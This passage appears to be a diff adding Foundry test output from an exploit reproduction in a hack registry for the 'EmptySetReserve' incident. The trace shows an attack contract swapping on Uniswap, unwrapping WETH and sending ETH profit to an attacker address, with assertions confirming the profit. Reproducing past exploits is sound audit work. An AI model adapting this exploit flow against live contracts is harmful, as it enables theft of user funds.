+    │   │   │   │   │   └─ ← [Return] 14488353976620 [1.448e13]
+    │   │   │   │   └─ ← [Return] 14488353976620 [1.448e13]
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3989088154148474295575 [3.989e21]
+    │   │   │   ├─ emit Sync(reserve0: 14488353976620 [1.448e13], reserve1: 3989088154148474295575 [3.989e21])
+    │   │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 4531880 [4.531e6], amount1In: 0, amount0Out: 0, amount1Out: 1244022632550036 [1.244e15], to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6881fb970000000000d83fbc78890198a3ab00000000000000000d2d54ec0a84 → 0x6881fb970000000000d83fb80d1a6a7d951700000000000000000d2d5531312c
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return] [4531880 [4.531e6], 1244022632550036 [1.244e15]]
+    │   ├─ [534] WETH9::balanceOf(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 415694159819274524 [4.156e17]
+    │   ├─ [9195] WETH9::withdraw(415694159819274524 [4.156e17])
+    │   │   ├─ [55] EmptySetReserveAttack::receive{value: 415694159819274524}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Withdrawal(src: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], wad: 415694159819274524 [4.156e17])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000000005c4d7a2cb3b791c → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [0] EOA attacker::fallback{value: 416271181367327696}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::assertEq(416271181367327696 [4.162e17], 416271181367327696 [4.162e17], "ETH profit mismatch") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertGt(416271181367327696 [4.162e17], 415688696263702812 [4.156e17], "profit below traced transfer") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1339] USDC::fallback(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "attack contract kept USDC") [staticcall]
+    │   └─ ← [Return]
+    ├─ [788] COMP::balanceOf(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "attack contract kept COMP") [staticcall]
+    │   └─ ← [Return]
+    ├─ [876] ESS::balanceOf(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 204890442016374993231659 [2.048e23]
+    ├─ [0] VM::assertEq(204890442016374993231659 [2.048e23], 204890442016374993231659 [2.048e23], "unexpected ESS residual") [staticcall]
+    │   └─ ← [Return]
+    ├─ [858] DSU::balanceOf(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "attack contract kept DSU") [staticcall]
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit ETH Balance", val: 416271181367327696 [4.162e17], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.98ms (9.30ms CPU time)
+
+Ran 1 test suite in 4.30s (13.98ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+./_shared/run_poc.sh: line 68: 23451 Killed: 9               anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: ~/RustroverProjects/audits/evm-hack-registry/2025-07-EmptySetReserve_exp)
